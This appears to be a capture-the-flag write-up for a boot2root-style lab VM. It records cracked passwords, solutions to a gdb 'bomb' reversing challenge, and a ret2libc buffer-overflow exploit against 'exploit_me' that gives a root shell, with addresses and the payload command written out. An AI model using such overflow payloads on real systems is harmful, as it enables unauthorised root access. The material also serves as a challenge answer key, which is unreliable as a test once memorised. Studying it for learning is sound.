
### lmezard

We can see tar archive here. There are a lot of files in this archieve. Every file contains
line of code and comments with number of this line. We can use our "build_program.py" script to get
full program. Compile and run this program. Got "Iheartpwnage" password and advice to use sha-256.

### laurie
echo -n "Iheartpwnage" | shasum -a 256
laurie : 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

There is bomb here. Bomb contains of 6 phases. We should input correct key in each stage.

scp -P 2222 laurie@127.0.0.1:bomb ./

gdb bomb
    disas main
    disas phase_1
    x/1cs 0x80497c0
    "Public speaking is very easy."

    disas phase_2
    Program expects 6 numbers. First is 1, and every number = prev * (index(cur) + 1)
    "1 2 6 24 120 720"

    disas phase_3
    It is very difficult to read this asm code. And We downloaded cutter to decompile bomb. Yeah, this way is much better.
    We see switch-case condition here and there is several correct combinations.
    0 q 777
    1 b 214

    phase_4
    Recursive function, which returns sum of calls this function with num - 1 and num - 2. If num < 2 function returns 1. We need 55.
    1 -> 1
    2 -> 2
    3 -> 3
    4 -> 5
    5 -> 8
    6 -> 13
    7 -> 21
    8 -> 34
    9 -> 55

    phase_5
    So we will have some sex with bytes here.
    We shoud get word "giants". Program expects 6 charachters.
    Logical AND with 0xF uses for each inputed character, and then get this num as index of "isrveawhobpnutfg" array.
    So we need indexes: 15 0 5 11 13 1.
    Look at ascii table and get characters which hexadecimal second digit are f, 0, 5, b, d, 1. It is "opekmq".

    phase_6
    Program expects 6 numbers.
    Inside program is array with numbers 253 725 301 997 212 432.
    There are 4 cycles here.
    1) Checks that each number is unique and 1 <= n <= 6.
    2) 3) Build new array from program's array with inputed indexes.
    4) Check that new array is sorted.
    So we need numbers "4 2 6 3 1 5".

README says to remove spaces when we have FULL the password. Ok, lets concatenate all strings and remove spaces.
"Publicspeakingisveryeasy.126241207201b2149opekmq426135". This is password for thor.

### thor
Use our "parse_turtle_steps.py" script and look at word "SLASH".
md5 -s SLASH -> "646da671ca01bb5d84dbb5fb2238dc8e" password for zaz.

### zaz
You can see expolit_me file there. This program takes argument and prints it. With decompiled code we can see that there is only 140 bytes buffer inside main.
And strcpy uses here. Excellent opportunity to overflow buffer and use ret2lib exploit.

gdb exploit_me
    break main
    run
    print &system                           > 0xb7e6b060 > '\xb7\xe6\xb0\x60'
    find &system, +9999999, "/bin/sh"       > 0xb7f8cc58 > '\xb7\xf8\xcc\x58'

./exploit_me $(python -c "print('a' * 140 + '\xb7\xe6\xb0\x60'[::-1] + 'aaaa' + '\xb7\xf8\xcc\x58'[::-1])")

Whaaat is going on? Whoami? A im root! System has been fucked.

Description of ret2lib exploit.
https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf

Gdb useful things.
https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf
